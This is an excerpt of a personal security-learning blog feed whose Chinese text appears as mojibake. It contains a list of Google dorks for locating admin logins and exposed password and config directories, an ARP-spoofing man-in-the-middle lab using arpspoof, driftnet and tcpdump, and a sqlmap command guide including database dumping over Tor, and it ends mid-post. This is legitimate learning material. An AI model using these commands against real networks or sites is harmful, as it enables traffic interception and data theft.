        <content type="html"><![CDATA[<h2 id="Google-Hacking"><a href="#Google-Hacking" class="headerlink" title="Google Hacking"></a>Google Hacking</h2><p>Google hackingæ˜¯ä¸€ç³»åˆ—ç”¨äºé«˜æ•ˆè¿ç”¨æœç´¢å¼•æ“çš„æŠ€å·§ï¼Œä¹Ÿå¯ä»¥ç”¨äºæµ‹è¯•æ¼æ´ç­‰ç”¨å¤„</p><p>A and B</p><p>é€»è¾‘ä¸ï¼Œç”¨äºæŸ¥æ‰¾åŒæ—¶åŒ…å«Aå’ŒBçš„å†…å®¹</p><p>A or B</p><p>é€»è¾‘æˆ–ï¼Œç”¨äºæŸ¥æ‰¾åŒ…å«Aæˆ–åŒ…å«Bæˆ–åŒæ—¶åŒ…å«Aå’ŒBçš„å†…å®¹</p><p>A -B</p><p>é€»è¾‘éï¼Œç”¨äºæŸ¥æ‰¾Aä½†ä¸åŒ…å«Bçš„å†…å®¹</p><p>â€œxxx yyyâ€</p><p>å®Œæ•´åŒ¹é…ï¼Œç”¨äºæŸ¥æ‰¾å¸¦æœ‰å®Œæ•´xxx yyyçš„å†…å®¹</p><p>site:xxx.com yyy</p><p>æŒ‡å®šæœç´¢èŒƒå›´ï¼Œç”¨äºæœç´¢ç‰¹å®šèŒƒå›´ï¼ˆxxx.comï¼‰å†…æœ‰å…³yyyçš„å†…å®¹</p><p>filetype:txt xxx</p><p>æŒ‡å®šæœç´¢æ–‡ä»¶ç±»å‹ï¼Œç”¨äºæœç´¢æœ‰å…³xxxçš„txtæ–‡ä»¶</p><p>inurl:aaa</p><p>æœç´¢åŒ¹é…ç½‘å€ä¸­å¸¦aaaçš„å†…å®¹</p><p>allinurl: aaa bbb</p><p>ä¸inurlç›¸ä¼¼ï¼Œåªä¸è¿‡å¯ä»¥æŒ‡å®šå¤šä¸ªå…³é”®è¯</p><p>intext:aaa xxx</p><p>æœç´¢åŒ¹é…ç½‘é¡µæ­£æ–‡ä¸­å¸¦aaaçš„ä¸”æœ‰å…³xxxçš„å†…å®¹</p><p>intitle:xxx</p><p>æœç´¢åŒ¹é…ç½‘é¡µçš„æ ‡é¢˜ä¸­åŒ…å«xxxçš„å†…å®¹</p><p>xxx*</p><p>ä½¿ç”¨é€šé…ç¬¦*æœç´¢æœ‰å…³ä»¥xxxä¸ºå‰ç¼€çš„å†…å®¹</p><p>link:xxx.com</p><p>è¿”å›æ‰€æœ‰æŒ‡å‘xxx.comçš„ç½‘é¡µ</p><p>related:xxx.com</p><p>è¿”å›æ‰€æœ‰ä¸xxx.comç›¸ä¼¼çš„ç½‘é¡µï¼ˆæŒ‡å¸ƒå±€ç›¸ä¼¼ï¼‰</p><p>cache:xxx.com [yyy]</p><p>è¿”å›æœç´¢å¼•æ“æœ‰å…³xxx.comçš„ç¼“å­˜ï¼Œå¦‚æœåŠ ä¸Šå…³é”®è¯ï¼Œåˆ™ç½‘é¡µä¸­çš„å…³é”®è¯ä¼šè¢«é«˜äº®</p><p>info:<a href="http://www.xxx.com/">www.xxx.com</a></p><p>è¿”å›æœ‰å…³ç«™ç‚¹<a href="http://www.xxx.comçš„ç›¸å…³ä¿¡æ¯/">www.xxx.comçš„ç›¸å…³ä¿¡æ¯</a></p><p>define:xxx</p><p>è¿”å›æœ‰å…³xxxçš„å®šä¹‰</p><p>Index of /xxx</p><p>è¿”å›å…è®¸å½“ä½œç›®å½•è®¿é—®çš„ç½‘é¡µ</p><h2 id="ä¸€äº›æŠ€å·§ï¼š"><a href="#ä¸€äº›æŠ€å·§ï¼š" class="headerlink" title="ä¸€äº›æŠ€å·§ï¼š"></a>ä¸€äº›æŠ€å·§ï¼š</h2><h3 id="æŸ¥æ‰¾ç½‘ç«™åå°"><a href="#æŸ¥æ‰¾ç½‘ç«™åå°" class="headerlink" title="æŸ¥æ‰¾ç½‘ç«™åå°"></a>æŸ¥æ‰¾ç½‘ç«™åå°</h3><p>site:xx.com intext:ç®¡ç†</p><p>site:xx.com inurl:login</p><p>site:xx.com intitle:åå°</p><h3 id="æŸ¥çœ‹æœåŠ¡å™¨ä½¿ç”¨çš„ç¨‹åº"><a href="#æŸ¥çœ‹æœåŠ¡å™¨ä½¿ç”¨çš„ç¨‹åº" class="headerlink" title="æŸ¥çœ‹æœåŠ¡å™¨ä½¿ç”¨çš„ç¨‹åº"></a>æŸ¥çœ‹æœåŠ¡å™¨ä½¿ç”¨çš„ç¨‹åº</h3><p>site:xx.com filetype:asp</p><p>site:xx.com filetype:php</p><p>site:xx.com filetype:jsp</p><p>site:xx.com filetype:aspx</p><h3 id="æŸ¥çœ‹ä¸Šä¼ æ¼æ´"><a href="#æŸ¥çœ‹ä¸Šä¼ æ¼æ´" class="headerlink" title="æŸ¥çœ‹ä¸Šä¼ æ¼æ´"></a>æŸ¥çœ‹ä¸Šä¼ æ¼æ´</h3><p>site:xx.com inurl:file</p><p>site:xx.com inurl:load</p><h3 id="æŸ¥çœ‹å¯è®¿é—®ç›®å½•"><a href="#æŸ¥çœ‹å¯è®¿é—®ç›®å½•" class="headerlink" title="æŸ¥çœ‹å¯è®¿é—®ç›®å½•"></a>æŸ¥çœ‹å¯è®¿é—®ç›®å½•</h3><p>index of /admin</p><p>index of /passwd</p><p>index of /password</p><p>index of /mail</p><p>â€œindex of /â€œ +passwd</p><p>â€œindex of /â€œ +password.txt</p><p>â€œindex of /â€œ +.htaccess</p><p>â€œindex of /rootâ€</p><p>â€œindex of /cgi-binâ€</p><p>â€œindex of /logsâ€</p><p>â€œindex of /configâ€</p><blockquote><p>quote<br><a href="https://blog.csdn.net/weixin_51339377/article/details/124005136">Google-Hacking è¯­æ³•ç¬”è®°_Simon_Smithçš„åšå®¢-CSDNåšå®¢</a></p><p><a href="https://blog.csdn.net/qq_35733751/article/details/105258082">2-ä¿¡æ¯æ”¶é›†â€”Google hacking_songly_çš„åšå®¢-CSDNåšå®¢</a></p><p><a href="https://blog.csdn.net/qq_36119192/article/details/84029809">ä¿¡æ¯æ”¶é›†ä¹‹Google Hackingçš„ç®€å•ç”¨æ³•_è°¢å…¬å­çš„åšå®¢-CSDNåšå®¢_google hacking</a></p><p><a href="https://blog.csdn.net/huweiliyi/article/details/105442118">Google Hackingä½¿ç”¨è¯¦è§£_Teacher.Huçš„åšå®¢-CSDNåšå®¢_google hacking</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> Internet </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>arpæ¬ºéª—åˆæ¬¡å°è¯•</title>
      <link href="2022/04/03/arp_cheat/"/>
      <url>2022/04/03/arp_cheat/</url>
      
        <content type="html"><![CDATA[<h2 id="ARPæ¬ºéª—æ˜¯ä»€ä¹ˆ"><a href="#ARPæ¬ºéª—æ˜¯ä»€ä¹ˆ" class="headerlink" title="ARPæ¬ºéª—æ˜¯ä»€ä¹ˆ"></a>ARPæ¬ºéª—æ˜¯ä»€ä¹ˆ</h2><p>ARPæ¬ºéª—ï¼ˆARP spoofingï¼‰ï¼Œåˆç§°ARPæ¯’åŒ–ï¼ˆARP poisoningï¼Œç½‘ç»œä¸Šå¤šè¯‘ä¸ºARPç—…æ¯’ï¼‰æˆ–ARPæ”»å‡»ï¼Œæ˜¯é’ˆå¯¹<a href="https://baike.baidu.com/item/%E4%BB%A5%E5%A4%AA%E7%BD%91">ä»¥å¤ªç½‘</a><a href="https://baike.baidu.com/item/%E5%9C%B0%E5%9D%80%E8%A7%A3%E6%9E%90%E5%8D%8F%E8%AE%AE">åœ°å€è§£æåè®®</a>ï¼ˆ<a href="https://baike.baidu.com/item/ARP">ARP</a>ï¼‰çš„ä¸€ç§æ”»å‡»æŠ€æœ¯ï¼Œé€šè¿‡æ¬ºéª—å±€åŸŸç½‘å†…è®¿é—®è€…PCçš„ç½‘å…³MACåœ°å€ï¼Œä½¿è®¿é—®è€…PCé”™ä»¥ä¸ºæ”»å‡»è€…æ›´æ”¹åçš„MACåœ°å€æ˜¯ç½‘å…³çš„MACï¼Œå¯¼è‡´ç½‘ç»œä¸é€šã€‚æ­¤ç§æ”»å‡»å¯è®©æ”»å‡»è€…è·å–<a href="https://baike.baidu.com/item/%E5%B1%80%E5%9F%9F%E7%BD%91">å±€åŸŸç½‘</a>ä¸Šçš„æ•°æ®åŒ…ç”šè‡³å¯ç¯¡æ”¹æ•°æ®åŒ…ï¼Œä¸”å¯è®©ç½‘ç»œä¸Šç‰¹å®šè®¡ç®—æœºæˆ–æ‰€æœ‰è®¡ç®—æœºæ— æ³•æ­£å¸¸è¿çº¿ã€‚</p><p>ä»¥ä¸Šæ¥è‡ªç™¾åº¦ç™¾ç§‘</p><h2 id="ä¸ªäººç†è§£"><a href="#ä¸ªäººç†è§£" class="headerlink" title="ä¸ªäººç†è§£"></a>ä¸ªäººç†è§£</h2><p>å¤§æ¦‚åŸç†å°±æ˜¯åœ¨æ¯å°ç”¨äºä¸Šç½‘çš„æœºå™¨ä¸­éƒ½ä¼šæœ‰ä¸€å¼ å«arpç¼“å­˜è¡¨çš„ä¸œè¥¿ï¼Œé‡Œè¾¹è®°å½•äº†ipåœ°å€ä¸macåœ°å€ï¼ˆç‰©ç†åœ°å€ï¼‰çš„æ˜ å°„å…³ç³»</p><p>è¿™å¼ è¡¨çš„å½¢æˆè¿‡ç¨‹å¦‚ä¸‹ï¼š</p><p>å‡è®¾ç°åœ¨æˆ‘è¦ä¸ipåœ°å€ä¸º192.168.1.2çš„ä¸»æœºé€šä¿¡ï¼Œæˆ‘å°±å‘å±€åŸŸç½‘å†…çš„æ‰€æœ‰ä¸»æœºå¹¿æ’­æ¶ˆæ¯â€œè°æ˜¯192.168.1.2 ï¼Ÿâ€ï¼Œè¿™æ—¶å¦‚æœè¯¥ipçš„ä¸»æœºæ”¶åˆ°äº†å¹¿æ’­ï¼Œå°±ä¼šå‘å‘å‡ºå¹¿æ’­çš„ä¸»æœºå›åº”â€œ192.168.1.2æ˜¯æˆ‘ï¼Œæˆ‘çš„macåœ°å€æ˜¯xxxâ€ï¼Œç„¶åå‘å‡ºå¹¿æ’­çš„ä¸»æœºå°±å°†è¯¥ipå’Œè¯¥macåœ°å€è®°å½•åˆ°æœ¬æœºçš„arpç¼“å­˜è¡¨ä¸­</p><p>è€Œarpæ¬ºéª—è¦åšçš„ï¼Œå°±æ˜¯å‡è£…è‡ªå·±æ˜¯æŸä¸€å°è¢«è¯·æ±‚çš„ä¸»æœºï¼ŒæŠŠè‡ªå·±çš„macåœ°å€ä¸è¢«å‡è£…ä¸»æœºçš„ipç»‘å®šèµ·æ¥è®°å½•åœ¨åˆ«äººçš„arpç¼“å­˜è¡¨ä¸­ï¼›ç”±äºç½‘ç»œçš„å®é™…ä¼ è¾“æ˜¯é€šè¿‡macåœ°å€è¿›è¡Œå¯»å€çš„ï¼Œè¿™æ ·æ‰€æœ‰å‘é€åˆ°è¢«å‡è£…ä¸»æœºçš„ä¿¡æ¯éƒ½ä¼šé€šè¿‡macåœ°å€å‘é€åˆ°æ¶æ„ä¸»æœºä¸Š</p><h2 id="å…·ä½“è¿‡ç¨‹"><a href="#å…·ä½“è¿‡ç¨‹" class="headerlink" title="å…·ä½“è¿‡ç¨‹"></a>å…·ä½“è¿‡ç¨‹</h2><p>è®¾å¤‡ï¼šæ‰‹æœºä¸€å°ï¼Œç”µè„‘ä¸€å°ï¼Œæ ‘è“æ´¾ä¸€ä¸ª</p><p>è¯´æ˜ï¼š</p><ul>    <li>æ‰‹æœºå……å½“å—å®³è€…ï¼ˆipï¼š192.168.137.116ï¼‰</li>    <li>ç”µè„‘å……å½“ç½‘å…³ï¼ˆå¼€çƒ­ç‚¹ ipï¼š192.168.137.1ï¼‰</li>    <li>æ ‘è“æ´¾ä½œä¸ºæ”»å‡»æœºå™¨ï¼ˆipï¼š192.168.137.66ï¼‰</li></ul><p>ä½¿ç”¨ç¨‹åºï¼šarpspoof(éœ€è¦å®‰è£…dsniffä¸ssldump)ï¼Œtcpdumpï¼Œdriftnet</p><blockquote><p>ä¸ºä»€ä¹ˆéœ€è¦æ ‘è“æ´¾ï¼Ÿ</p><p>æœ¬æ¥æ‰“ç®—ç”¨vmwareæ¨¡æ‹Ÿæ‰€æœ‰çš„ä¸»æœºçš„ï¼Œä½†æ˜¯ç”±äºå±€åŸŸç½‘çš„é…ç½®é—®é¢˜æ— æ³•ç”¨vmwareæ¨¡æ‹Ÿæ‰€æœ‰æœºå™¨ï¼Œæ¨¡æ‹Ÿä¸€éƒ¨åˆ†çš„è¯åˆä¼šå› ä¸ºå±€åŸŸç½‘çš„é—®é¢˜å¯¼è‡´è™šæ‹Ÿæœºä¸ç‰©ç†æœºæ— æ³•è¿›è¡Œæ­£å¸¸é€šä¿¡ï¼Œæ‰€ä»¥å°±æ‹¿å‡ºäº†æˆ‘åƒç°å¤šå¹´çš„åŸç”Ÿæ ‘è“æ´¾</p></blockquote><p>é¦–å…ˆä½¿ç”¨nmapæ‰«æå—å®³è€…</p><p><a href="https://www.helloimg.com/image/RJkmoX"><img src="https://www.helloimg.com/images/2022/04/03/RJkmoX.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/04/03/RJkmoX.png" srcset="data:image/png;base64,666" alt="RJkmoX.png"></a></p><p>ç¡®å®šäº†å—å®³è€…çš„ipä¹‹åä½¿ç”¨å‘½ä»¤</p><p>arpspoof -i [ç½‘å¡ï¼ˆæ­¤å¤„ä¸ºwlan0ï¼‰] -t [ç›®æ ‡ip] [ç½‘å…³ip]</p><p>è¿›è¡Œæ¬ºéª—</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo arpspoof -i wlan0 -t 192.168.137.116 192.168.137.1</span><br></pre></td></tr></table></figure><p>å¦‚æœä»…ä»…åªæ˜¯æƒ³å¯¹ç›®æ ‡ä¸»æœºè¿›è¡Œæ–­ç½‘æ“ä½œçš„è¯æ— éœ€å…¶ä»–æ“ä½œï¼Œä½†æ˜¯å¦‚æœæƒ³è¿›è¡ŒåŒå‘çš„æ¬ºéª—ï¼ˆä¸­é—´äººæ”»å‡»ï¼‰ï¼Œå°±å¿…é¡»æ‰“å¼€æ ‘è“æ´¾çš„è½¬å‘åŠŸèƒ½ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure><p>ç„¶åå†æ‰“å¼€å¦ä¸€ä¸ªçª—å£ï¼Œå®‰è£…driftnet</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install driftnet</span><br><span class="line">sudo driftnet -i [ç›‘å¬ç½‘å¡] -a -d [æˆªå–çš„å›¾ç‰‡çš„å­˜æ”¾ç›®å½•]</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±å¯ä»¥è·å–å—å®³è€…æ­¤æ—¶çš„å›¾ç‰‡äº†</p><p><a href="https://www.helloimg.com/image/RJkHXz"><img src="https://www.helloimg.com/images/2022/04/03/RJkHXz.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/04/03/RJkHXz.png" srcset="data:image/png;base64,666" alt="RJkHXz.png"></a></p><blockquote><p>å¦‚æœç”¨æ ‘è“æ´¾æŸ¥çœ‹å›¾ç‰‡ä¸æ–¹ä¾¿ï¼Œå¯ä»¥æ‰“å¼€80ç«¯å£ï¼ŒæŠŠå›¾ç‰‡æ”¾åˆ°ç½‘ç«™æ ¹ç›®å½•ä¸‹å†ä»æµè§ˆå™¨è®¿é—®</p></blockquote><p>å®é™…ä¸Šåœ¨æˆ‘è¿›è¡Œå®éªŒæ—¶ï¼Œæˆªå›¾è·å–å¾—å¹¶ä¸æ˜¯å¾ˆé¡ºåˆ©ï¼Œæ‰€ä»¥æˆ‘é€‰æ‹©äº†å¦å¤–ä¸€ç§è·å–é€šä¿¡ä¿¡æ¯çš„æ–¹å¼â€”â€”tcpdump</p><p>åœ¨arpspoofå‘½ä»¤è¿è¡Œçš„æ—¶å€™ï¼Œç”±äºå—å®³è€…ä¸ç½‘å…³çš„æ‰€æœ‰é€šä¿¡éƒ½ä¼šç»è¿‡æ”»å‡»æœºçš„ç½‘å¡ï¼Œæ•…æˆ‘ä»¬å¯ä»¥ç”¨tcpdumpæ¥è·å–æœ¬åœ°ç½‘å¡æ¥æ”¶åˆ°çš„ä¿¡æ¯ã€‚å‘½ä»¤å¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tcpdump -i wlan0 -s 0 -w e.cap</span><br></pre></td></tr></table></figure><p>wlan0æ˜¯ç½‘å¡ï¼Œe.capæ˜¯æŠ“åŒ…å­˜æ”¾çš„æ–‡ä»¶åç§°ï¼Œå›è½¦ä¹‹åä¾¿å¼€å§‹æŠ“åŒ…ï¼Œç­‰åˆ°ä»€ä¹ˆæ—¶å€™è§‰å¾—å·®ä¸å¤šäº†å°±crtl+Cåœæ­¢å°±è¡Œï¼Œæ­¤æ—¶åœ¨å½“å‰ç›®å½•ä¸‹åº”è¯¥ä¼šå‡ºç°åˆšåˆšæŠ“åŒ…çš„æ–‡ä»¶ï¼ˆæ­¤å¤„ä¸ºe.capï¼‰ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è¯»å–ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tcpdump -A -r e.cap </span><br></pre></td></tr></table></figure><p>-Aæ˜¯ä»¥asciiå½¢å¼æ˜¾ç¤º -råé¢çš„æ˜¯è¦æ‰“å¼€çš„æ–‡ä»¶ï¼Œé™¤äº†è¿™ç§æ‰“å¼€æ–¹å¼ï¼Œè¿˜æœ‰ç±»ä¼¼è¿‡æ»¤å™¨çš„åŠŸèƒ½</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tcpdump -n dst host 119.91.135.95 -r e.cap</span><br></pre></td></tr></table></figure><p>è¯¥å‘½ä»¤è¿‡æ»¤äº†ipä¸º119.91.135.95çš„é€šä¿¡ä¿¡æ¯å¹¶æ˜¾ç¤ºåœ¨å±å¹•ä¸Š</p><p><a href="https://www.helloimg.com/image/RJkDzS"><img src="https://www.helloimg.com/images/2022/04/03/RJkDzS.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/04/03/RJkDzS.png" srcset="data:image/png;base64,666" alt="RJkDzS.png"></a></p><p>ä»¥ä¸Šæ˜¯ä¼ è¾“è¿‡ç¨‹ä¸­æˆªå–çš„ä¿¡æ¯</p><blockquote><p>quote<br><a href="https://baike.baidu.com/item/ARP%E6%AC%BA%E9%AA%97/2805503">ARPæ¬ºéª—_ç™¾åº¦ç™¾ç§‘ (baidu.com)</a></p><p><a href="https://www.cnblogs.com/longliz/p/15040093.html">kaili linuxä½¿ç”¨arpspoofè¿›è¡Œarpæ¬ºéª— - é—»æ‰€æœªé—» - åšå®¢å›­ (cnblogs.com)</a></p><p><a href="https://blog.csdn.net/mr__sheng/article/details/123757426">ARPâ€“åˆ©ç”¨arpspoofå’Œdriftnetå·¥å…·è¿›è¡Œarpæ¬ºéª—_mr_xiukçš„åšå®¢-CSDNåšå®¢_arpspoof</a></p><p><a href="https://blog.51cto.com/u_14354846/2408291">kali linuxæ“ä½œç³»ç»Ÿä¸­TCPDUMPè¯¦ç»†ä½¿ç”¨æ–¹æ³•_éš”å£è€æ¹¿çš„æŠ€æœ¯åšå®¢_51CTOåšå®¢</a></p><p><a href="https://blog.csdn.net/weixin_39190897/article/details/104569308">Kaliæ¸—é€-ARPæ–­ç½‘æ”»å‡»ä¸ç›‘å¬_Tr0eçš„åšå®¢-CSDNåšå®¢_kaliå±€åŸŸç½‘æ¸—é€ç›‘æ§</a></p><p><a href="https://www.cnblogs.com/0day-li/p/6059297.html">kali linuxä¸‹çš„arpæ”»å‡» - é€—æ¯”å¤§å¸ˆ - åšå®¢å›­ (cnblogs.com)</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> Internet </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SqlmapåŸºæœ¬æ“ä½œ</title>
      <link href="2022/03/29/sqlmap/"/>
      <url>2022/03/29/sqlmap/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.helloimg.com/image/RqDeM6"><img src="https://www.helloimg.com/images/2022/03/29/RqDeM6.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/03/29/RqDeM6.png" srcset="data:image/png;base64,666" alt="RqDeM6.png"></a></p><h2 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h2><h3 id="Linux-Mac-OS"><a href="#Linux-Mac-OS" class="headerlink" title="Linux / Mac OS"></a>Linux / Mac OS</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev</span><br></pre></td></tr></table></figure><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><p>å®‰è£…git-bashä¹‹ååœ¨é€‰å®šç›®å½•ä¸‹å³é”®æ‰“å¼€git-bashçª—å£è¿è¡Œä¸Šè¿°å‘½ä»¤å³å¯</p><p>ä¸‹è½½åœ°å€ï¼š</p><p><a href="https://github.com/git-for-windows/git/releases/download/v2.35.1.windows.2/Git-2.35.1.2-64-bit.exe">https://github.com/git-for-windows/git/releases/download/v2.35.1.windows.2/Git-2.35.1.2-64-bit.exe</a></p><h2 id="å¸¸ç”¨å‘½ä»¤"><a href="#å¸¸ç”¨å‘½ä»¤" class="headerlink" title="å¸¸ç”¨å‘½ä»¤"></a>å¸¸ç”¨å‘½ä»¤</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -h<span class="comment"># è·å–å¸¸è§é€‰é¡¹</span></span><br><span class="line">python sqlmap.py -hh<span class="comment"># è·å–æ‰€æœ‰é€‰é¡¹</span></span><br><span class="line">python sqlmap.py -u www.example.com <span class="comment"># æ£€æµ‹GETæ³¨å…¥</span></span><br><span class="line">python sqlmap.py -u www.example.com --batch  <span class="comment"># ä½¿ç”¨é»˜è®¤é€‰é¡¹ï¼ˆä¸ç”¨æ‰‹åŠ¨é€‰æ‹©y/nï¼‰</span></span><br><span class="line">python sqlmap.py -u www.example.com --batch --dbs --tables --columns<span class="comment"># è¿”å›æ•°æ®åº“/è¡¨/åˆ—</span></span><br><span class="line">python sqlmap.py -u www.example.com --batch -D xxx -T xxx -C xxx<span class="comment"># æŒ‡å®šæ•°æ®åº“/è¡¨/åˆ—</span></span><br><span class="line">python sqlmap.py -u www.example.com --batch --dump   <span class="comment"># ç›´æ¥è¿”å›æ•°æ®åº“å†…å®¹</span></span><br></pre></td></tr></table></figure><p><strong>æ³¨ï¼šå¦‚æœæ˜¯åœ¨Linuxç³»ç»Ÿä¸‹ï¼Œpythonå‘½ä»¤å¯èƒ½è°ƒç”¨çš„æ˜¯python2ï¼Œå¦‚æœæŠ¥é”™å¯å°†pythonæ¢ä¸ºpython3</strong></p><p>â€‹        <strong>å¦‚æœæœ‰å…¶ä»–æŠ¥é”™ï¼Œå°è¯•å°†ç½‘å€ç­‰å‚æ•°ç”¨åŒå¼•å·åŒ…è£¹</strong></p><p>â€‹        <strong>Windowsä¸‹å¯åœ¨å‘½ä»¤æç¤ºç¬¦æˆ–powershellä¸‹è¿è¡Œ</strong></p><ul>    <li>åœ¨è¿”å›æ•°æ®åº“/è¡¨/åˆ—æ—¶ï¼Œå¯åªæŒ‡å®šä¸€é¡¹</li>    <li>åœ¨æŒ‡å®šæ•°æ®åº“/è¡¨/åˆ—æ—¶ï¼Œä¹Ÿå¯åªæŒ‡å®šä¸€é¡¹</li>    <li>ä¸€èˆ¬å°†dumpé€‰é¡¹å’Œä¸Šè¿°å‘½ä»¤ç»“åˆï¼Œç›´æ¥è¿”å›æ³¨å…¥ç»“æœ</li></ul><h2 id="æ›´å¤šç©æ³•"><a href="#æ›´å¤šç©æ³•" class="headerlink" title="æ›´å¤šç©æ³•"></a>æ›´å¤šç©æ³•</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -m 1.txt<span class="comment"># ä»æ–‡ä»¶ä¸­å¯¼å…¥url</span></span><br><span class="line">python sqlmap.py -r res.txt<span class="comment"># ä»æ–‡ä»¶ä¸­å¯¼å…¥httpå“åº”</span></span><br><span class="line">python sqlmap.py -l burp.txt<span class="comment"># ä»æ–‡ä»¶ä¸­å¯¼å…¥burpæŠ“åŒ…æ–‡ä»¶</span></span><br><span class="line">python sqlmap.py -u www.example.com  --data=<span class="string">&quot;id=1&quot;</span>  <span class="comment"># ä½¿ç”¨POSTæ³¨å…¥</span></span><br><span class="line">python sqlmap.py -u www.example.com --level 2  <span class="comment"># ä½¿ç”¨2çº§æ³¨å…¥ï¼Œæ£€æµ‹cookieæ³¨å…¥</span></span><br><span class="line">python sqlmap.py -u www.example.com --level 3  <span class="comment"># ä½¿ç”¨3çº§æ³¨å…¥ï¼Œæ£€æµ‹refereræ³¨å…¥å’ŒUSER-AGENTæ³¨å…¥</span></span><br><span class="line">python sqlmap.py -u www.example.com --level 5  <span class="comment"># ä½¿ç”¨5çº§æ³¨å…¥ï¼Œæ£€æµ‹hostæ³¨å…¥</span></span><br><span class="line">python sqlmap.py -u www.example.com --random-agent     <span class="comment"># ä½¿ç”¨éšæœºä»£ç†</span></span><br><span class="line">python sqlmap.py -u www.example.com --tor  <span class="comment"># ä½¿ç”¨åŒ¿åtorç½‘ç»œ</span></span><br><span class="line">python sqlmap.py -u www.example.com --hpp  <span class="comment"># æ£€æµ‹httpæ±¡æŸ“</span></span><br></pre></td></tr></table></figure><p>levelé»˜è®¤ä¸º1ï¼ŒèŒƒå›´ä¸º 1 - 5</p><p><strong>æ›´å¤šç”¨æ³•å’Œå‘½ä»¤å¯å‚ç…§å®˜ç½‘æ–‡æ¡£ï¼š<a href="http://sqlmap.org/">http://sqlmap.org/</a></strong></p><blockquote><p>quote<br><a href="https://github.com/sqlmapproject/sqlmap">GitHub - sqlmapproject/sqlmap: Automatic SQL injection and database takeover tool</a></p><p><a href="https://blog.csdn.net/smli_ng/article/details/106026901">sqlmapè¯¦ç»†ä½¿ç”¨æ•™ç¨‹_æ˜Ÿè½.çš„åšå®¢-CSDNåšå®¢_sqlmap</a></p><p><a href="https://www.freebuf.com/sectool/164608.html">è¶…è¯¦ç»†SQLMapä½¿ç”¨æ”»ç•¥åŠæŠ€å·§åˆ†äº« - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æœ‰å…³BTç§å­çš„ä¸€äº›äº‹</title>
      <link href="2022/03/27/bit_torrent/"/>
      <url>2022/03/27/bit_torrent/</url>
      
        <content type="html"><![CDATA[<h2 id="Bit-Torrent-BTç§å­-æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#Bit-Torrent-BTç§å­-æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="Bit Torrent (BTç§å­)æ˜¯ä»€ä¹ˆï¼Ÿ"></a>Bit Torrent (BTç§å­)æ˜¯ä»€ä¹ˆï¼Ÿ</h2><blockquote><p>BitTorrent(ç®€ç§°BT)æ˜¯ä¸€ä¸ªæ–‡ä»¶åˆ†å‘åè®®ï¼Œæ¯ä¸ªä¸‹è½½è€…åœ¨ä¸‹è½½çš„åŒæ—¶ä¸æ–­å‘å…¶ä»–ä¸‹è½½è€…ä¸Šä¼ å·²ä¸‹è½½çš„æ•°æ®ã€‚è€Œåœ¨<a href="https://baike.baidu.com/item/FTP/13839">FTP</a>,<a href="https://baike.baidu.com/item/HTTP">HTTP</a>åè®®ä¸­ï¼Œæ¯ä¸ªä¸‹è½½è€…åœ¨ä¸‹è½½è‡ªå·±æ‰€éœ€æ–‡ä»¶çš„åŒæ—¶ï¼Œå„ä¸ªä¸‹è½½è€…ä¹‹é—´æ²¡æœ‰äº¤äº’ã€‚å½“éå¸¸å¤šçš„ç”¨æˆ·åŒæ—¶è®¿é—®å’Œä¸‹è½½æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶æ—¶ï¼Œç”±äºFTPæœåŠ¡å™¨å¤„ç†èƒ½åŠ›å’Œå¸¦å®½çš„é™åˆ¶ï¼Œä¸‹è½½é€Ÿåº¦ä¼šæ€¥å‰§ä¸‹é™ï¼Œæœ‰çš„ç”¨æˆ·å¯èƒ½è®¿é—®ä¸äº†æœåŠ¡å™¨ã€‚BTåè®®ä¸FTPåè®®ä¸åŒï¼Œç‰¹ç‚¹æ˜¯ä¸‹è½½çš„äººè¶Šå¤šï¼Œä¸‹è½½é€Ÿåº¦è¶Šå¿«ï¼ŒåŸå› 